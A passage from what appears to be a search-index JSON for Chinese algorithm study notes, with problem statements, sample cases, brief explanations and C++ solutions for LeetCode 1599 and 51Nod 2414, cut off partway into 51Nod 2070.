\u6b21\u5f97\u5230\u6700\u5927\u5229\u6da6\uff0c\u6700\u5927\u5229\u6da6\u4e3a$122 \u3002 1.7. Notes # n == customers.length 1 <= n <= 10^5 0 <= customers[i] <= 50 1 <= boardingCost, runningCost <= 100 1.8. Source # Leetcode 1599 \u7ecf\u8425\u6469\u5929\u8f6e\u7684\u6700\u5927\u5229\u6da6 2. \u89e3\u8bfb # \u7b80\u5355\u9898\uff0c\u6309\u7167\u9898\u610f\u8fdb\u884c\u6a21\u62df\u5373\u53ef\u3002 3. \u4ee3\u7801 # class Solution { public: int minOperationsMaxProfit(vector<int>& customers, int boardingCost, int runningCost) { long long nums = 0, buffer = 0; int maxProfit = 0, profit = 0, ans = 0; size_t i = 0, len = customers.size(); while (i < len || nums > 0) { if (i < len) { nums += customers[i]; } i++; // \u8ba1\u7b97\u4e0a\u8f66\u4eba\u6570 buffer = min(nums, 4LL); // \u8ba1\u7b97\u5229\u6da6 profit += buffer * boardingCost - runningCost; // \u51cf\u53bb\u4e0a\u8f66\u4eba\u6570 nums -= buffer; if (profit > maxProfit) { ans = i; maxProfit = profit; } } return maxProfit > 0 ? ans : -1; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://blog.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"11.Leetcode 1599 \u7ecf\u8425\u6469\u5929\u8f6e\u7684\u6700\u5927\u5229\u6da6"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#leetcode-1599","text":"","title":"Leetcode 1599 \u7ecf\u8425\u6469\u5929\u8f6e\u7684\u6700\u5927\u5229\u6da6"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#_1","text":"Leetcode 1599 \u7ecf\u8425\u6469\u5929\u8f6e\u7684\u6700\u5927\u5229\u6da6 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#11-limit","text":"Time Limit: 2000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#12-problem-description","text":"\u4f60\u6b63\u5728\u7ecf\u8425\u4e00\u5ea7\u6469\u5929\u8f6e\uff0c\u8be5\u6469\u5929\u8f6e\u5171\u6709 4 \u4e2a\u5ea7\u8231 \uff0c\u6bcf\u4e2a\u5ea7\u8231 \u6700\u591a\u53ef\u4ee5\u5bb9\u7eb3 4 \u4f4d\u6e38\u5ba2 \u3002\u4f60\u53ef\u4ee5 \u9006\u65f6\u9488 \u8f6e\u8f6c\u5ea7\u8231\uff0c\u4f46\u6bcf\u6b21\u8f6e\u8f6c\u90fd\u9700\u8981\u652f\u4ed8\u4e00\u5b9a\u7684\u8fd0\u884c\u6210\u672c runningCost \u3002\u6469\u5929\u8f6e\u6bcf\u6b21\u8f6e\u8f6c\u90fd\u6070\u597d\u8f6c\u52a8 1 / 4 \u5468\u3002 \u7ed9\u4f60\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u6570\u7ec4 customers \uff0c customers[i] \u662f\u5728\u7b2c i \u6b21\u8f6e\u8f6c\uff08\u4e0b\u6807\u4ece 0 \u5f00\u59cb\uff09\u4e4b\u524d\u5230\u8fbe\u7684\u65b0\u6e38\u5ba2\u7684\u6570\u91cf\u3002\u8fd9\u4e5f\u610f\u5473\u7740\u4f60\u5fc5\u987b\u5728\u65b0\u6e38\u5ba2\u5230\u6765\u524d\u8f6e\u8f6c i \u6b21\u3002\u6bcf\u4f4d\u6e38\u5ba2\u5728\u767b\u4e0a\u79bb\u5730\u9762\u6700\u8fd1\u7684\u5ea7\u8231\u524d\u90fd\u4f1a\u652f\u4ed8\u767b\u8231\u6210\u672c boardingCost \uff0c\u4e00\u65e6\u8be5\u5ea7\u8231\u518d\u6b21\u62b5\u8fbe\u5730\u9762\uff0c\u4ed6\u4eec\u5c31\u4f1a\u79bb\u5f00\u5ea7\u8231\u7ed3\u675f\u6e38\u73a9\u3002 \u4f60\u53ef\u4ee5\u968f\u65f6\u505c\u4e0b\u6469\u5929\u8f6e\uff0c\u5373\u4fbf\u662f \u5728\u670d\u52a1\u6240\u6709\u6e38\u5ba2\u4e4b\u524d \u3002\u5982\u679c\u4f60\u51b3\u5b9a\u505c\u6b62\u8fd0\u8425\u6469\u5929\u8f6e\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6240\u6709\u6e38\u5ba2\u5b89\u5168\u7740\u9646\uff0c\u5c06\u514d\u8d39\u8fdb\u884c\u6240\u6709\u540e\u7eed\u8f6e\u8f6c \u3002\u6ce8\u610f\uff0c\u5982\u679c\u6709\u8d85\u8fc7 4 \u4f4d\u6e38\u5ba2\u5728\u7b49\u6469\u5929\u8f6e\uff0c\u90a3\u4e48\u53ea\u6709 4 \u4f4d\u6e38\u5ba2\u53ef\u4ee5\u767b\u4e0a\u6469\u5929\u8f6e\uff0c\u5176\u4f59\u7684\u9700\u8981\u7b49\u5f85 \u4e0b\u4e00\u6b21\u8f6e\u8f6c \u3002 \u8fd4\u56de\u6700\u5927\u5316\u5229\u6da6\u6240\u9700\u6267\u884c\u7684 \u6700\u5c0f\u8f6e\u8f6c\u6b21\u6570 \u3002 \u5982\u679c\u4e0d\u5b58\u5728\u5229\u6da6\u4e3a\u6b63\u7684\u65b9\u6848\uff0c\u5219\u8fd4\u56de -1 \u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#13-sample-input-1","text":"\u8f93\u5165\uff1acustomers = [8,3], boardingCost = 5, runningCost = 6","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#14-sample-output-1","text":"\u8f93\u51fa\uff1a3 \u89e3\u91ca\uff1a\u5ea7\u8231\u4e0a\u6807\u6ce8\u7684\u6570\u5b57\u662f\u8be5\u5ea7\u8231\u7684\u5f53\u524d\u6e38\u5ba2\u6570\u3002 1. 8 \u4f4d\u6e38\u5ba2\u62b5\u8fbe\uff0c4 \u4f4d\u767b\u8231\uff0c4 \u4f4d\u7b49\u5f85\u4e0b\u4e00\u8231\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 4 * $5 - 1 * $6 = $14 \u3002 2. 3 \u4f4d\u6e38\u5ba2\u62b5\u8fbe\uff0c4 \u4f4d\u5728\u7b49\u5f85\u7684\u6e38\u5ba2\u767b\u8231\uff0c\u5176\u4ed6 3 \u4f4d\u7b49\u5f85\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 8 * $5 - 2 * $6 = $28 \u3002 3. \u6700\u540e 3 \u4f4d\u6e38\u5ba2\u767b\u8231\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 11 * $5 - 3 * $6 = $37 \u3002 \u8f6e\u8f6c 3 \u6b21\u5f97\u5230\u6700\u5927\u5229\u6da6\uff0c\u6700\u5927\u5229\u6da6\u4e3a $37 \u3002","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#15-sample-input-2","text":"\u8f93\u5165\uff1acustomers = [10,9,6], boardingCost = 6, runningCost = 4","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#16-sample-output-2","text":"\u8f93\u51fa\uff1a7 \u89e3\u91ca\uff1a 1. 10 \u4f4d\u6e38\u5ba2\u62b5\u8fbe\uff0c4 \u4f4d\u767b\u8231\uff0c6 \u4f4d\u7b49\u5f85\u4e0b\u4e00\u8231\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 4 * $6 - 1 * $4 = $20 \u3002 2. 9 \u4f4d\u6e38\u5ba2\u62b5\u8fbe\uff0c4 \u4f4d\u767b\u8231\uff0c11 \u4f4d\u7b49\u5f85\uff082 \u4f4d\u662f\u5148\u524d\u5c31\u5728\u7b49\u5f85\u7684\uff0c9 \u4f4d\u65b0\u52a0\u5165\u7b49\u5f85\u7684\uff09\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 8 * $6 - 2 * $4 = $40 \u3002 3. \u6700\u540e 6 \u4f4d\u6e38\u5ba2\u62b5\u8fbe\uff0c4 \u4f4d\u767b\u8231\uff0c13 \u4f4d\u7b49\u5f85\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 12 * $6 - 3 * $4 = $60 \u3002 4. 4 \u4f4d\u767b\u8231\uff0c9 \u4f4d\u7b49\u5f85\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a * $6 - 4 * $4 = $80 \u3002 5. 4 \u4f4d\u767b\u8231\uff0c5 \u4f4d\u7b49\u5f85\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 20 * $6 - 5 * $4 = $100 \u3002 6. 4 \u4f4d\u767b\u8231\uff0c1 \u4f4d\u7b49\u5f85\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 24 * $6 - 6 * $4 = $120 \u3002 7. 1 \u4f4d\u767b\u8231\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 25 * $6 - 7 * $4 = $122 \u3002 \u8f6e\u8f6c 7 \u6b21\u5f97\u5230\u6700\u5927\u5229\u6da6\uff0c\u6700\u5927\u5229\u6da6\u4e3a$122 \u3002","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#17-notes","text":"n == customers.length 1 <= n <= 10^5 0 <= customers[i] <= 50 1 <= boardingCost, runningCost <= 100","title":"1.7. Notes"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#18-source","text":"Leetcode 1599 \u7ecf\u8425\u6469\u5929\u8f6e\u7684\u6700\u5927\u5229\u6da6","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#2","text":"\u7b80\u5355\u9898\uff0c\u6309\u7167\u9898\u610f\u8fdb\u884c\u6a21\u62df\u5373\u53ef\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/#3","text":"class Solution { public: int minOperationsMaxProfit(vector<int>& customers, int boardingCost, int runningCost) { long long nums = 0, buffer = 0; int maxProfit = 0, profit = 0, ans = 0; size_t i = 0, len = customers.size(); while (i < len || nums > 0) { if (i < len) { nums += customers[i]; } i++; // \u8ba1\u7b97\u4e0a\u8f66\u4eba\u6570 buffer = min(nums, 4LL); // \u8ba1\u7b97\u5229\u6da6 profit += buffer * boardingCost - runningCost; // \u51cf\u53bb\u4e0a\u8f66\u4eba\u6570 nums -= buffer; if (profit > maxProfit) { ans = i; maxProfit = profit; } } return maxProfit > 0 ? ans : -1; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://blog.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/","text":"51Nod 2414 \u542f\u8499\u7ec3\u4e60-\u56fe\u5f62\u8f93\u51fa2 # \u76ee\u5f55 # 51Nod 2414 \u542f\u8499\u7ec3\u4e60-\u56fe\u5f62\u8f93\u51fa2 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u8f93\u5165\u4e00\u4e2a\u6570 n \uff0c\u8f93\u51fa n \u5c42\u56fe\u5f62\uff0c\u89c1\u4e0b\uff08\u56fe\u4e3a n=4 \u7684\u60c5\u51b5\uff09 * *** ***** ******* 1.3. Input # \u8f93\u5165\u4e00\u4e2a\u6570 N 1.4. Output # \u8f93\u51fa\u76f8\u5e94\u7684\u56fe\u5f62 1.5. Sample Input # 5 1.6. Sample Output # * *** ***** ******* ********* 1.7. Source # 2414 \u542f\u8499\u7ec3\u4e60-\u56fe\u5f62\u8f93\u51fa2 2. \u89e3\u8bfb # \u5047\u8bbe\u884c\u53f7\u4e3a i \uff0c i \\in [0, N-1] \uff0c\u6bcf\u4e00\u884c\u8f93\u51fa 2 \\times i - 1 \u4e2a\u7b26\u53f7 * \u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; int main() { long long n; // \u8bfb\u5165n scanf(\"%lld\", &n); // \u8f93\u51fa\u56fe\u5f62 for (int i = 0; i < n; i++) { for (int j = 0; j < 2 * i + 1; j++) { printf(\"*\"); } printf(\"\\n\"); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.51Nod 2414 \u542f\u8499\u7ec3\u4e60 \u56fe\u5f62\u8f93\u51fa2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#51nod-2414-2","text":"","title":"51Nod 2414 \u542f\u8499\u7ec3\u4e60-\u56fe\u5f62\u8f93\u51fa2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#_1","text":"51Nod 2414 \u542f\u8499\u7ec3\u4e60-\u56fe\u5f62\u8f93\u51fa2 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#12-problem-description","text":"\u8f93\u5165\u4e00\u4e2a\u6570 n \uff0c\u8f93\u51fa n \u5c42\u56fe\u5f62\uff0c\u89c1\u4e0b\uff08\u56fe\u4e3a n=4 \u7684\u60c5\u51b5\uff09 * *** ***** *******","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#13-input","text":"\u8f93\u5165\u4e00\u4e2a\u6570 N","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#14-output","text":"\u8f93\u51fa\u76f8\u5e94\u7684\u56fe\u5f62","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#15-sample-input","text":"5","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#16-sample-output","text":"* *** ***** ******* *********","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#17-source","text":"2414 \u542f\u8499\u7ec3\u4e60-\u56fe\u5f62\u8f93\u51fa2","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#2","text":"\u5047\u8bbe\u884c\u53f7\u4e3a i \uff0c i \\in [0, N-1] \uff0c\u6bcf\u4e00\u884c\u8f93\u51fa 2 \\times i - 1 \u4e2a\u7b26\u53f7 * \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/2.51Nod_2414_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%9B%BE%E5%BD%A2%E8%BE%93%E5%87%BA2/#3","text":"#include <iostream> using namespace std; int main() { long long n; // \u8bfb\u5165n scanf(\"%lld\", &n); // \u8f93\u51fa\u56fe\u5f62 for (int i = 0; i < n; i++) { for (int j = 0; j < 2 * i + 1; j++) { printf(\"*\"); } printf(\"\\n\"); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/","text":"51Nod 2070 \u6700\u5c0f\u7f5a\u6b3e # \u76ee\u5f55 # 51Nod 2070 \u6700\u5c0f\u7f5a\u6b3e \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u5c0f\u4f1f\u62a5\u540d\u53c2\u52a0\u4e2d\u592e\u7535\u89c6\u53f0\u7684\u667a\u529b\u5927\u51b2\u6d6a\u8282\u76ee\u3002\u672c\u6b21\u6311\u6218\u8d5b\u5438\u5f15\u4e86\u4f17\u591a\u53c2\u8d5b\u8005\uff0c\u4e3b\u6301\u4eba\u4e3a\u4e86\u8868\u5f70\u5927\u5bb6\u7684\u52c7\u6c14\uff0c\u5148\u5956\u52b1\u6bcf\u4e2a\u53c2\u8d5b\u8005 m \u5143\u3002\u5148\u4e0d\u8981\u592a\u9ad8\u5174\uff01\u56e0\u4e3a\u8fd9\u4e9b\u94b1\u8fd8\u4e0d\u4e00\u5b9a\u90fd\u662f\u4f60\u7684\uff1f\uff01\u63a5\u4e0b\u6765\u4e3b\u6301\u4eba\u5ba3\u5e03\u4e86\u6bd4\u8d5b\u89c4\u5219\uff1a \u9996\u5148\uff0c\u6bd4\u8d5b\u65f6\u95f4\u5206\u4e3a n \u4e2a\u65f6\u6bb5 (n\u2264500) \uff0c\u5b83\u53c8\u7ed9\u51fa\u4e86\u5f88\u591a\u5c0f\u6e38\u620f\uff0c\u6bcf\u4e2a\u5c0f\u6e38\u620f\u90fd\u5fc5\u987b\u5728\u89c4\u5b9a\u671f\u9650 t_i \u524d\u5b8c\u6210 (1 \\le t_i \\le n) \u3002\u5982\u679c\u4e00\u4e2a\u6e38\u620f\u6ca1\u80fd\u5728\u89c4\u5b9a\u671f\u9650\u524d\u5b8c\u6210\uff0c\u5219\u8981\u4ece\u5956\u52b1\u8d39 m \u5143\u4e2d\u6263\u53bb\u4e00\u90e8\u5206\u94b1 w_i \uff0c w_i \u4e3a\u81ea\u7136\u6570\uff0c\u4e0d\u540c\u7684\u6e38\u620f\u6263\u53bb\u7684\u94b1\u662f\u4e0d\u4e00\u6837\u7684\u3002\u73b0\u5728\u4f60\u8981\u8bbe\u8ba1\u65b9\u6cd5\uff0c\u4f7f\u5f97\u4f60\u80fd\u5f97\u5230\u6700\u591a\u7684\u5956\u52b1\u3002 1.3. Input # \u8f93\u5165\u5171 4 \u884c \u7b2c 1 \u884c\u4e3a m \uff0c\u8868\u793a\u4e00\u5f00\u59cb\u5956\u52b1\u7ed9\u6bcf\u4f4d\u53c2\u8d5b\u8005\u7684\u94b1\uff1b \u7b2c 2 